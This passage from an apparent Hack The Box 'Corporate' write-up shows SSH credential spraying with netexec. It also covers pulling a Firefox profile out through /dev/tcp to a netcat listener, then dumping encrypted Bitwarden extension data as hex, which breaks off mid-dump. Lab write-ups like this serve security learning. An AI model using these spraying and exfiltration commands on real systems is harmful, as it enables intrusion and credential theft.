Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 154.36 seconds
           Raw packets sent: 153447 (6.752MB) | Rcvd: 147823 (5.913MB)
```

We don't have nothing new but we can connect to ssh with those users (we also could be able with the first vpn we had) in 10.9.0.4:

```bash
❯ cat hosts
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hosts
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 10.9.0.1
   2   │ 10.9.0.4
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ cat grabbed_usernames.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: grabbed_usernames.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ elwin.jones
   2   │ laurie.casper
   3   │ nya.little
   4   │ brody.wiza
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ cat grabbed_passwords.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: grabbed_passwords.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ CorporateStarter04041987
   2   │ CorporateStarter18111959
   3   │ CorporateStarter21061965
   4   │ CorporateStarter14071992
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
```bash
❯ netexec ssh hosts -u grabbed_usernames.txt -p grabbed_passwords.txt --no-bruteforce --continue-on-success
SSH         10.9.0.1        22     10.9.0.1         [*] SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u2
SSH         10.9.0.4        22     10.9.0.4         [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
SSH         10.9.0.1        22     10.9.0.1         [-] elwin.jones:CorporateStarter04041987
SSH         10.9.0.1        22     10.9.0.1         [-] laurie.casper:CorporateStarter18111959
SSH         10.9.0.1        22     10.9.0.1         [-] nya.little:CorporateStarter21061965
SSH         10.9.0.1        22     10.9.0.1         [-] brody.wiza:CorporateStarter14071992
SSH         10.9.0.4        22     10.9.0.4         [+] elwin.jones:CorporateStarter04041987  Linux - Shell access!
SSH         10.9.0.4        22     10.9.0.4         [+] laurie.casper:CorporateStarter18111959  Linux - Shell access!
SSH         10.9.0.4        22     10.9.0.4         [+] nya.little:CorporateStarter21061965  Linux - Shell access!
SSH         10.9.0.4        22     10.9.0.4         [+] brody.wiza:CorporateStarter14071992  Linux - Shell access!
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

I will connect witl elwin.jones and see user.txt:

```bash
❯ ssh elwin.jones@10.9.0.4
elwin.jones@10.9.0.4's password: 
<..SNIP..>
elwin.jones@corporate-workstation-04:~$ cat user.txt 
b7****************************a5
```

Also we can see that this is the host machine for docker containers (interface docker0) and that we are in a virtual box or something like that (interface ens18):

```bash
elwin.jones@corporate-workstation-04:~$ hostname
corporate-workstation-04
elwin.jones@corporate-workstation-04:/home/guests$ hostname -I
10.9.0.4 172.17.0.1 
elwin.jones@corporate-workstation-04:~$ ifconfig
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:38:92:5c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens18: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.9.0.4  netmask 255.255.255.0  broadcast 10.9.0.255
        inet6 fe80::f875:4eff:febc:ac92  prefixlen 64  scopeid 0x20<link>
        ether fa:75:4e:bc:ac:92  txqueuelen 1000  (Ethernet)
        RX packets 82881  bytes 19440026 (19.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 84453  bytes 19533446 (19.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 395102  bytes 28081392 (28.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 395102  bytes 28081392 (28.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We can't run docker because /var/run/docker.sock is owned by user root and group engineer:

```bash
elwin.jones@corporate-workstation-04:~$ docker ps
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json": dial unix /var/run/docker.sock: connect: permission denied
elwin.jones@corporate-workstation-04:~$ ls -l /var/run/docker.sock
srw-rw---- 1 root engineer 0 Jul 17 19:54 /var/run/docker.sock
```

If we manage to belong to the engineer group, I can privesc by creating a docker container with a mount of / at /mnt for example and see all files of the vm inside the host machine. Interestingly, user elwin.jones isn't in /etc/passwd and group engineer neither in /etc/groups:

```bash
elwin.jones@corporate-workstation-04:~$ grep engineer /etc/group
elwin.jones@corporate-workstation-04:~$ grep elwin.jones /etc/passwd
```

So probably the VM isn't managed with /etc/passwd and /etc/group. I want to think that it's managed with LDAP because /etc/sssd exists and LDAP port is open in 10.9.0.1 as we saw before in nmap:

```bash
elwin.jones@corporate-workstation-04:~$ ls /etc/sssd/
ls: cannot open directory '/etc/sssd/': Permission denied
```

Also, our pwd is /home/guests/elwin.jones. And if we login as another user we grabbed its password, it creates its directory which will be /home/guests/{user}:

```bash
elwin.jones@corporate-workstation-04:~$ pwd
/home/guests/elwin.jones
```

```bash
❯ sshpass -p CorporateStarter18111959 ssh laurie.casper@10.9.0.4 'pwd'
/home/guests/laurie.casper
```

This directories are created using autofs (nfs protocol):

```bash
elwin.jones@corporate-workstation-04:~$ mount
<..SNIP..>
corporate.htb:/home/guests/elwin.jones on /home/guests/elwin.jones type nfs4 (rw,relatime,vers=4.2,rsize=524288,wsize=524288,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.9.0.4,local_lock=none,addr=10.9.0.1)
tmpfs on /run/user/5021 type tmpfs (rw,nosuid,nodev,relatime,size=149504k,nr_inodes=37376,mode=700,uid=5021,gid=5021,inode64)
corporate.htb:/home/guests/laurie.casper on /home/guests/laurie.casper type nfs4 (rw,relatime,vers=4.2,rsize=524288,wsize=524288,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.9.0.4,local_lock=none,addr=10.9.0.1)
corporate.htb:/home/guests/nya.little on /home/guests/nya.little type nfs4 (rw,relatime,vers=4.2,rsize=524288,wsize=524288,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.9.0.4,local_lock=none,addr=10.9.0.1)
corporate.htb:/home/guests/brody.wiza on /home/guests/brody.wiza type nfs4 (rw,relatime,vers=4.2,rsize=524288,wsize=524288,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.9.0.4,local_lock=none,addr=10.9.0.1)
```

But we can't connect because of iptables that says:

```bash
elwin.jones@corporate-workstation-04:~$ nc -zv 10.9.0.1 2049
nc: connect to 10.9.0.1 port 2049 (tcp) failed: Connection refused
elwin.jones@corporate-workstation-04:~$ cat /etc/iptables/rules.v4
# Generated by iptables-save v1.8.7 on Sat Apr 15 13:45:23 2023
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A OUTPUT -p tcp -m owner ! --uid-owner 0 -m tcp --dport 2049 -j REJECT --reject-with icmp-port-unreachable
COMMIT
# Completed on Sat Apr 15 13:45:23 2023
```

# Access as root on corporate-workstation-04

In the home directory of elwin.jones there is a .mozilla directory:

```bash
elwin.jones@corporate-workstation-04:~$ ls -la
```
![.mozilla directory in elwin.jones](/assets/images/Corporate/mozilla-directory-elwin.jones.png)

I will download it and inspect it in my machine:

**Attacker machine**:
```bash
❯ nc -lvnp 443 > mozilla-zipped.tar
listening on [any] 443 ...
```

**Victim machine**:
```bash
elwin.jones@corporate-workstation-04:~$ tar czf .mozilla-zipped .mozilla/
elwin.jones@corporate-workstation-04:~$ ls -l .mozilla-zipped 
-rw-rw-r-- 1 elwin.jones elwin.jones 427888 Jul 18 16:45 .mozilla-zipped
elwin.jones@corporate-workstation-04:~$ cat .mozilla-zipped > /dev/tcp/10.10.14.133/443
elwin.jones@corporate-workstation-04:~$ rm .mozilla-zipped 
```

Uncompress it and we have it:

```bash
❯ tar -xf mozilla-zipped.tar
❯ ls .mozilla
extensions  firefox
```

The interesting profile is `tr2cgmb6.default-release` because it has bunch more files:

```bash
❯ cd .mozilla/firefox
❯ /bin/ls tr2cgmb6.default-release
AlternateServices.txt	     cert9.db		   credentialstate.sqlite	favicons.sqlite     permissions.sqlite	  search.json.mozlz4		      storage
SiteSecurityServiceState.txt  compatibility.ini     datareporting		formhistory.sqlite  pkcs11.txt		  security_state		      storage.sqlite
addonStartup.json.lz4	     containers.json	   extension-preferences.json	handlers.json	   places.sqlite	  sessionCheckpoints.json	      times.json
addons.json		     content-prefs.sqlite  extension-store		key4.db		   prefs.js		  sessionstore-backups		      webappsstore.sqlite
bookmarkbackups		     cookies.sqlite	   extensions			lock		   protections.sqlite	  sessionstore.jsonlz4		      xulstore.json
browser-extension-data	     crashes		   extensions.json		minidumps	   saved-telemetry-pings  shield-preference-experiments.json
❯ /bin/ls ye8h1m54.default
times.json
```

There is no file logins.json, so there is no saved passwords that we could decrypt as said [here](https://github.com/lclevy/firepwd):

```bash
❯ find . -name logins.json
```

However, in addons.json, it's the bitwarden password manager, which is interesting as we can try to retrieve passwords:

```bash
❯ cat addons.json | jq '.addons[].name'
"English (GB) Language Pack"
"Language: English (CA)"
"Bitwarden - Free Password Manager"
```

And in places.sqlite, in table moz_places, it looks like elwin.jones was getting started on bitwarden and he searched if 4 digits are enough for a bitwarden pin:

```plaintext
❯ sqlite3 places.sqlite
SQLite version 3.44.2 2023-11-24 11:41:44
Enter ".help" for usage hints.
sqlite> .tables
moz_anno_attributes                 moz_keywords                      
moz_annos                           moz_meta                          
moz_bookmarks                       moz_origins                       
moz_bookmarks_deleted               moz_places                        
moz_historyvisits                   moz_places_metadata               
moz_inputhistory                    moz_places_metadata_search_queries
moz_items_annos                     moz_previews_tombstones         
```

```plaintext
sqlite> select * from moz_places;
1|https://www.mozilla.org/privacy/firefox/||gro.allizom.www.|1|1|0|25|1681400333037910|yZ7pVlxR_J5G|0|47356411089529||||1|0
2|https://www.mozilla.org/en-US/privacy/firefox/|Firefox Privacy Notice — Mozilla|gro.allizom.www.|1|0|0|100|1681400333095967|qMP6DODLnNK8|0|47358032558425|
  Our Privacy Notices describe the data our products and services receive, share, and use, as well as choices available to you.
|https://www.mozilla.org/media/img/mozorg/mozilla-256.4720741d4108.jpg||1|0
3|https://support.mozilla.org/products/firefox||gro.allizom.troppus.|0|0|0|1||5kDP-c2HzT7U|1|47358327123126||||2|1
4|https://support.mozilla.org/kb/customize-firefox-controls-buttons-and-toolbars?utm_source=firefox-browser&utm_medium=default-bookmarks&utm_campaign=customize||gro.allizom.troppus.|0|0|0|1||bQUK5jRKzF0U|1|47359956450016||||2|1
5|https://www.mozilla.org/contribute/||gro.allizom.www.|0|0|0|1||ye-XA9FHIDj2|1|47357364218428||||1|1
6|https://www.mozilla.org/about/||gro.allizom.www.|0|0|0|1||0TY3joPtLyE_|1|47357608426557||||1|1
7|http://www.ubuntu.com/||moc.utnubu.www.|0|0|0|1||fMlEPB5oJHET|1|125508050257634||||3|1
8|http://wiki.ubuntu.com/||moc.utnubu.ikiw.|0|0|0|1||VvzmVWb-PRB_|1|125511519733047||||4|1
9|https://answers.launchpad.net/ubuntu/+addquestion||ten.daphcnual.srewsna.|0|0|0|1||fXipjwhCLAbQ|1|47359338650210||||5|1
10|http://www.debian.org/||gro.naibed.www.|0|0|0|1||Fz_7bmbI2kW0|1|125508165346216||||6|1
11|https://www.mozilla.org/firefox/?utm_medium=firefox-desktop&utm_source=bookmarks-toolbar&utm_campaign=new-users&utm_content=-global||gro.allizom.www.|0|0|0|1||RGEQRMoAL7Tk|1|47357369712570||||1|1
12|https://www.google.com/search?channel=fs&client=ubuntu&q=bitwarden+firefox+extension|bitwarden firefox extension - Google Search|moc.elgoog.www.|1|0|1|100|1681400341960242|MeMMGyINPGm0|0|47360254352664||||7|0
13|https://bitwarden.com/help/getting-started-browserext/|Password Manager Browser Extensions | Bitwarden Help Center|moc.nedrawtib.|1|0|0|100|1681400346849181|n7f8gwZ8PFxk|0|47358092040001|Learn how to get started with Bitwarden browser extensions. Explore your vault, launch a website, and autofill a login directly from the browser extension.|https://bitwarden.com/_gatsby/file/36d74bcd913442e52178ff86f1547694/help-getting-started-browserext-og.png?eu=d68851e5e799f8d60e68a5d06d20346de06956fdf70236813b60e3a84ca8c88422f14f5d76912eb0783f598b87e34bec64c22c634aea86dc93b511a7e93cff0b54845ae762b57655027a97a8b5a757406fc04b58a7d5c801f0397bd0b0e7e6731308586fe839b29ef3f06835e7d66c2cb9f2f07f2681fe3ca30c00018f0776be3ae8d6843248e693f718f0e49fe97dbff5e66a5426be906843282d1e10e565daf2ad55276820415333ceae5a956993b2694d60205f5c02a434328550fe3d35c7b6aabe058c263bfcff9c7534df9df99dae5efd6832b29b3afbc0643d4d58ee46e5f866a8857a4650d6||8|0
14|https://addons.mozilla.org/en-GB/firefox/addon/bitwarden-password-manager/|Bitwarden - Free Password Manager – Get this Extension for 🦊 Firefox (en-GB)|gro.allizom.snodda.|1|0|0|100|1681400353333457|3qhMMFBK6I6d|0|47356519448782|Download Bitwarden - Free Password Manager for Firefox. A secure and free password manager for all of your devices.|https://addons.mozilla.org/user-media/previews/full/253/253114.png?modified=1622132561||9|0
15|https://bitwarden.com/browser-start/|Browser Extension Getting Started | Bitwarden|moc.nedrawtib.|1|0|0|100|1681400362570919|CLmLNRdK5AXh|0|47356656284688|Answer the question of how secure is my password by using this guide to help ensure your passwords are strong, secure, and easy to manage.|https://bitwarden.com/_gatsby/file/3f0bfa47d7a430e28ca9f4f1f7be835e/bitwarden-og-alt.png?eu=d68b50e1b09aaf82083ef4833d26353db33650abab5135d03c6ce2ac1da19dd570a61b5d269c7ce07f3a5d8fd5e840ef64c22c664ce984d3c0ee1fa5e363ae5a06815fb866e622015429c7f7e3f40e44629e5e1ce1c0c217bc342f85b2e6f46e4a144a7aeb39edc5afb76b31f49c2870b4e5e0746494a325a7154157935a178116e5eea36942ecbce31f98bfb5da5f8e9bf87951408af161222649185aee79bba4b45175687f140935cffc0dc63491e03c147e71071b44a6256e850be63366deb5a7e54399242c||8|0
16|https://www.google.com/search?channel=fs&client=ubuntu&q=is+4+digits+enough+for+a+bitwarden+pin%3F|is 4 digits enough for a bitwarden pin? - Google Search|moc.elgoog.www.|1|0|1|100|1681400414755297|KJc-jCTzw8t7|0|47358316177995||||7|0
```

The corresponding data for this extension is in the database 3647222921wleabcEoxlt-eengsairo.sqlite in `storage/default/moz-extension+++c8dd0025-9c20-49fb-a398-307c74e6f8b7\^userContextId=4294967295/idb`:

```bash
❯ ls -la storage/default/moz-extension+++c8dd0025-9c20-49fb-a398-307c74e6f8b7\^userContextId=4294967295/idb
drwxr-xr-x gabri gabri 4.0 KB Thu Apr 13 17:40:32 2023  .
drwxr-xr-x gabri gabri 4.0 KB Thu Apr 13 17:39:22 2023  ..
drwxr-xr-x gabri gabri 4.0 KB Thu Apr 13 17:39:22 2023  3647222921wleabcEoxlt-eengsairo.files
.rw-r--r-- gabri gabri  56 KB Thu Apr 13 17:40:32 2023  3647222921wleabcEoxlt-eengsairo.sqlite
```

In this database, there is a data column:

```bash
sqlite> PRAGMA table_info(object_data);
0|object_store_id|INTEGER|1||1
1|key|BLOB|1||2
2|index_data_values|BLOB|0|NULL|0
3|file_ids|TEXT|0||0
4|data|BLOB|1||0
```

I will print all the data inside that column using hex because sqlite removes non-ascii characters:

```bash
sqlite> select hex(data) from object_data;
90B401040300010104F1FF01063C0800FFFF040000800400FFFF6461746101140101011800070D1818636970686572730117051800090D1820656E63727970746564051A0901013800240D209035353334663661372D313830662D343065302D626630382D656331373537363531646466000937053800020D3800690D51BE4800000E0D40306F7267616E697A6174696F6E490D4C100000FFFF080D2014666F6C646572111A39000C65646974018F20010000000200FFFF0C0D30287669657750617373776F72054E112000130D202E700018557365546F74700147152815781861766F72697465011D2E6000247265766973696F6E4461091C001B0D5868323032332D30342D31335431343A34393A34362E3335373937395A0143000031B8087479700554019800031DD0086E616D051800601150F0612E515246397649435172446548392F70374F30774447673D3D7C674E4A5078354664496639777366727937472F4161413D3D7C4B62303467756A35676E465165645645552F57785953354444504847454975322B5A58673155554E7A41733D05000045480C6E6F7465492E010108FFFF0D0D8014636F6C6C656329961120080700FF458800133D700863726525BC9A1001083830382910000B0D681864656C65746564113F0D01590018726570726F6D7025EC213011B8106C6F67696E0D2E41C831B80C75736572214C3948F05E563261684475674331376844637331445854755349513D3D7C686A6274636835666D53726E517930453544623857513D3D7C553050596C73345963356E53344A6A2F34577736324E7755484A5654574F66734E2F5934525941714F484D3D080DC800704D7400740D1058322E4970683336716D436F6D616973774C623134576C4121A7F05850494B43705A556A55616878495A4459383541336C4733494A7675774E4B37696A4C504930624F7339776F3D7C65787734656A57676A2B4A344A4D765665564E525A4141456C2B41454261397633743246734162724B35303D210F00140D80119000523AB0020901794800746D0100B40D3858322E6C6F557574576F5550377742784475586C502F35452130F09F7353395655656B5534703975656876626B376A6768706E7134386E776858534430364135554C474C7348366C61772F514B6669584D6D597979383638316349575357523750474B752F5570554F49353461785264624F6A39696456485949386A473278415A2F376A6771633D7C764E5A335A39455845372F427830473741686333763636663739736C6F464370515769514A7639684E62343D0000000012000045D0406175746F66696C6C4F6E506167654C6F618506110119F80875726945D7618851D84160012A41505168106D617463680115050108FFFF032D2808757269051239F050466C43544261586278646D7062654F6B63367356562138F05837484B53582F383041735A336B686B41504775364B4C3946727253315374324367736778706241623567343D7C41394638566D7876344E6C4E4B72426B556C6C32346D73373867413977524B4D796333635676496748536F3D058104000065909E0800D128A958250305F07E28063E600031200873656E95202138BE48009108997009940101CE5000910814706F6C69636989DBCE480000192DE871481047656E657285EA18486973746F727901A10D010160010BA118B1402E680611D22E280031281470726F766964F1B209012E280001120158D140086B6579114F052800120DA8E5DE2C6F53796D6D65747269634B651DA1015011703E080879F85050314C7174305378315232435174524E6B4D663566C170F09A65436F4B4B33724C4F4644722B686B454D6E4D5874304A56634871505843756A72475669732B4779773146723145336753632F766D6D68372F47767871355874726D38773151677753312F495051474578656F78667A5067436154354537686933613962363961365641593D7C36356464756D69375773776754305946796A5A2B7041686A7662443038612B467631357634724F345067633D0000211E690000102D082E7801004B2D2C6E0001010101200108216811081E500831A0114C010101305E50010101012001082E5000000A0DA01870726976617465A6A001000616F009F4D706322E78644D5932374D6850326A526D75444F2F526A6478773D3D7C507554436A666A363065583566513834754D59356D363274492F3467384A64383545644F2F3159654652594E3668774B537365564A3378625139314E4C314E66586C4632334F3669744673696F6F63744532557530717A7174717A4B6B304774334C786A4E6558736730774937594873695045633856496A6E41695A34614B66744F4B4C612B4E436B63464E4A4D6E4572713676414448656449487954626975327871343570477530724E587A69353962506E4F7977756E776D5A5732305471594E58614966392B73576F334876666541524A4C66347035397A505A4432533431476D6F75753065634B56427249584D336534662B67635952684371563832456A75726E416872514F74324B695851743375394E6C2F7A44384B645375477A6C56786F63394F445937504941567A56506A6142544A44656F54712F7A5836367A7A3571303931524E49384B564D676A376B4C6630334B705139506A6E6C5A63324A65594F513479576F704C5A3338317431574F476765532F693349623430656B45355344496B3333476A50744D372B63543148463332596C625949396D77454857546E34794D50354D446B5653382B456A5A75375A4F7654636937762F374E307832436F4B30342F423676596E45675A444257687035743366667A4C4575375739384334702B714B46554634786D2B7137484546706639555654584C62626D59524D565732755768306E674147436733597065596E33566B7976354E6D487867302B683250597666316F396A65496154355155526E723257624A62647375735839326C33774A3166513935612F2B7A524F4261635A316D4E4C33517A6F762F626C514A6F6341513830326D4949456F516530586E68463344426E5937506E6F565A5431626778326B614456464C6C4D41436F644D76466134354E7A39314E4234444E656A7A71304D797534564D584C773073663057644E5A3445456B4254556E56445153662F35737A61726D5734486745616B58394941737A50554D59474A4B617151396266355069736170396A5A4F654E4632304263707A78594E5654455A655137574F446D534F346673746248443562734A725238735063553231656B654E466A49686C39433732434357446576474F464974774C4A7035356458312F2F705844646752495A782F442B7A61723558582B41763341674F45794642363555644E6E51655049375546643433612B6B6D4144346E3864584A6B616C3247626842657A386A393851344E303847646A474D39636162586745566E69676550726733376B3859726842434C6D536A4F7A343048685954366B796E316773344E4A55306F6644366534446C39516C2F72373949427163654D756C6E3263554C396B42596852535253387646366975625675566831616D434E4350316B49756E6E2B325A57364F50576C446A56637A656273657869576731746743656B56784C45707345526F2B6830647133397537474C394876306C346E37374964524D73396C42777134446A6A683676524F2B3465714C774C4C787235445833516239794D2F62656F6E6E4D56454F7672384370706F7259727555794D6D776C394F594342704C7768635069503257743475455548766B526E5A7659552B784B74513249483836696A34756B47514E7550694A457A7676375A32336176335A77723169774C565553773843545950646A4E77387975714D455A6B4D4C776E4955324A58553533477258626F464E4755776A6C4551476A376C31506F346847307535564672485141697A55304D61564378444939584A4842566973594475535453477354492B347337347263667858666D64656B6E316A5362586F4378306859332F55375A6779547636704964463155354F4556443475444C314B7178326138316E4B36514477762F636E78544352564B32616F467557716774353762536333424D2F4756777550736F4D746F647A335776714F656C4D504D596B766A5144306D4450314174362F56664D6652304E504E306576746241584F5264787A4F576866492F5444754F506A32534C583649386A6137646A5279307953693173633953547462534365536A4D4D44396F682F496374416A375478355838556635714A594271446A585968396F43595065596B4A4C64356B376B635A6F756C7674646E507059584E647A4666527477517764326173324353494B772B464753506A424B7A364D644B6D684B5A494E4E543076596A67675238355537364862335063777273654E48612B4F4268595034797167634B515A35413D7C374A67516469624278627A3430784E544A4A4857653456384C4E7239457A7A3671452F52617A346F4F676F3D00000000000000001300FFFF0F0000800400FFFF63727970746F4D61737465724B657900E1280EF00FF1500C7075626C3ABF080400012A780E1EC00A0470720EE70B12330FE5700006ED600E000E0E2E101E90109830386233373531622D616164352D343631362D623166372D30313564336265373439646200000022A00F0E3C0E01941E980A20456C77696E204A6F6E164B0A00001EF80A1C656D61696C0000001E280A00650128042E6A01283040636F72706F726174652E6874055D04000022980D486861735072656D69756D506572736F6E616C6C12AA090E880C0E68101E400A106B646649741A720A0EF10908C0270912A00C3128146B64664D656D36880A21481E5811346B6466506172616C6C656C69736D0182010100FF35400C6B6466541A8B1005583158206B657948617368002C2D50C037344537316F505A4939764E6E6F45534E6B754C6C6144546C6B317A412F6348356C35584E4F4C4F6334773D000000000D0D3825201456657269666912741211E01EA8093C757365734B6579436F6E6E6563746F72019E2100001C0D403C636F6E766572744163636F756E74546F3E2C000901262810206C61737453796E63180D402E901130353A34303A32372E3533335A1A0D2039881046726F6D4F2A8612095A01012E78021E580C1873657474696E6721934578000F0D5034656E7669726F6E6D656E7455726C051F052000040D2008626173455800310D1018687474703A2F2F1E5F0C0874657305571465727665722D5941246C6F63616C3A383030300191000021AC16100A04617016800E09013908186964656E7469744554411051B00869636F4548090126E811186E6F746966696312DA0C09B6010100FF7550106576656E7415191968187765625661756C12981101681E300B006B3AD40109014638122070696E50726F7465632A93140E380B51E03EA80C008865A4F0C2FFFF32002E004400580047006400530061004E00380074004C0071003500740053005900580031004A0030005A00440067003D003D007C003400750058004C006D0052004E0070002F0064004A0067004500340031004D0059005600780071002B006E00760064006100750069006E007500300059004B00320065004B006F004D007600410045006D0076004A00380041004A003900440062006500780065007700720067006800580077006C00420076003900700052007C005500630042007A006905A4F0497500430069004A007000700035004D004F0052004200670048007600520032006D00560067007800330069006C007000510068004E0074007A004E004A0041007A00660034004D003D0021600E680C1E080E007621952054696D656F757441630EC01301222680140C6C6F636B011231B02E3000011804FFFF0EE410265015007031A50050226F1325F05E100300114DA0286571756976616C656E74440E0113555C0859000032701100023A100091C034616D65726974726164652E636F6DC10441FC00FF95400474643E220016080E81680EC81100043A580011981462616E6B6F66053C046361095B0501113811D808626F66051F01A001501118086D626E05180E981701181ED80D1475736563666F1D510D90114001302E6812113814737072696E7419381188D1080920087063730D2311501140146E657874656C0D1D0D014110017001A001082E7800D1D814796F757475622D5D00003960115810676F6F676C191F157871A00067E10036770005782178017801A82E78001138086170702E570015F011781469636C6F756436590001D000054D003ED00051302077656C6C73666172672D8431481E18080477660954019801A000164DA819381861647669736F7231692DC000065A780031A01C6D796D657272696C310C3E7800006D0D191178D1300D3608656467396501E800070D7001F02E400151C0046163E511106F6E6C696E193A394851A80C6369746901F2117871F001186104011C01E42150211011D001200C63617264310731D09160012001404281002D3000080DC001C82EC0001598046E6545EE312831F80118047476119659701E980808636F6D051D11B011D018646F776E6C6F61553211B01170086E657705CB215001E81170147365617263680553050131E811200475702E5600090121A000090DE001682EE00031201C62616E616E61726516C80A196011F011D008676170051D31A07198186F6C646E617679051C010111F031A01C70697065726C696D2EFC010198000A0D98000E3AF80431080C62696E6701551188117008686F7432CA0311901138086C6976056B3E88001C6D6963726F736F6625CDC960256011E0086D736E016F0E300B051831B00EF10818706F72742E6E65C570317811901077696E646F29B301FF0000414821B81EC01B15783A8102517831C0106F6666696305BA0547000031B8314809200833363505A6040000314031C815680EED151D48000B2D6831200C78626F780143000C0D1895E8047A752E37000E180B05C80010917809E832270021C811603E600211580875613291E3050131D03178047561897131C8311010756E6974657526018C010400FF41301238190920087769668536055B059011D801502EF00231D0006F0EA60B1DEB119011B00C7961686FAD93150101E8000D0D803E580031A01C7A6F6E65616C617269F699E011780120086C616265DC11590158610041303E580031080C706179702D23050111B0B1600920002D3E1F0405010160000F5AB80051100861766F45F9115811B00C796F7572111C054DAD3000100D5021F82E60017110106469617065DD951158117004736F894901F001F8510804776165EF9540113008796F79258F4160013031702062656175747962617241CD000012E80E052011380863617312F80871B0D1C82461667465727363686F6F497871B011380076CDA771A0311014626F6F6B776F35DF75A01138086C6F6FC5A47198F1E801500C6D61726BC946214649A800112D4821082E480171702831383030636F6E746163744534314811C83A1F00055921F000120D5800133A580551500C616D617A29F2053335A031581920042E620E010E01A0217871200D200061011C0101B1683A2000046361011DBD6831480D400C636F2E7512D80BD1E84A80000C61750000B5704A200000620E850F31C04A2000086D78000ED40E49184A200000740140B1683AC000006411E031D03A20001A5E110000B5603A20000066015C010191903A2000229D0C91583E2000C56D0400000E78224E8001006E0ECC11010171E03A40000070112071B03A2000007331A051883E2000310051503E20000067017D0D0141784170412841102ED00271E00063C97755702E1800E15B516851E024636F78627573696E657345FF056A016800142DD001302E6800F57018796E6F72746F6E1A780A8D1E59E871080926151F0501016000155A600091E00C766572692E410371983E200001D41101015800167A58001472616B757465199111583128046275266409015000175A500071681873697269757378D18F15503100092046000100180D58A1702E60011E980C0065A556465000106F7269676919BF35D071781C706C6179346672651E9B08412841301E002234746962657269756D616C6C69616E2E0A09A93000195A980011601C33377369676E616C11D3314031100ED0120863616D16C50A2AB00BB1A81120046871291411A011201C6869676872697365112001012188001A0D9801302E3001B1C824737465616D706F77657216CE0811981EB80905200C636F6D6D0ED10839E33540118005280C67616D6511E12D18001B0D803E1003D1981C63686172742E696F117851A805180069E55B014B050101D0001C5A5000719818676F746F6D65650EFD132529115811F01463697472697836ED0A0158001D5A5800119014676F676F6169F1CE59601158012018696E666C69676875D50158001E5A580091B00C6D797371E9EA090111B071080C6F72616332E10F2D58001F5A580051500C646973630E4C0A25054AB00011200E9C0E112401B000205A580071E8186463752E6F726715A851000C6463752D2D56011F0501015000210D503E80021138346865616C7468636172652E676F7639585180346375696461646F646573616C756409240101415061A0119808636D73151D017800220D7801282EF80231780C706570632E5E02317822B80A1C6570636F686F6C640E9D1631210D01016000235A600071F02063656E7475727932310D3C116031A00432312D2E128E130901015800240D583E3001518814636F6D636173556315583E2000B1E0210021281120107866696E692EC9034D5000250D7801302E3001D1B82C637269636B6574776972656C2EF40611D871800861696F42240001D800265A60003130106D616E64740E09112D11115831E0086D74620D1AA97000275A500011E80C64726F701A4B0E01E315505178086765743E230005A800285A580031B818736E617066697322EA1011A8117819201EC208095800290D583EB806113814616C69626162CDBD7DB011B018616C6965787072357B21A821D8912810616C697975DDE041400120F118006E0EE10B1ABC162190002A0D9001482EF00131C8E11004737412C718257811E81E501A2C736F6E79656E74657274616912A619146E6574776F7231BF05010168002B0D680E480B2E6800B138246D65726361646F6C697616DF0F116851783E200016560B000035004248000062094831004248000D20042E6116020B2190212862280012A60B090101D0002C0DD03E380131C8147A656E646573390711D091780C7A6F706922F5080D010158002D5A580051780E88292E5900115871400C74696E6B254B25AE09010158002E0D580E880C2E80011138107261696C6E29E700720ED00C3E58001D2012740C01F8213051280120002D0D4181CB31784A60000067217231704A200000750E171B4128016051F810747275636B0D6001811E300F31F8187472617669616E327A0801F8002F0DF801B02EF80031881C777063752E636F6F16AE2E46200401203EA20501580E381C01A001E82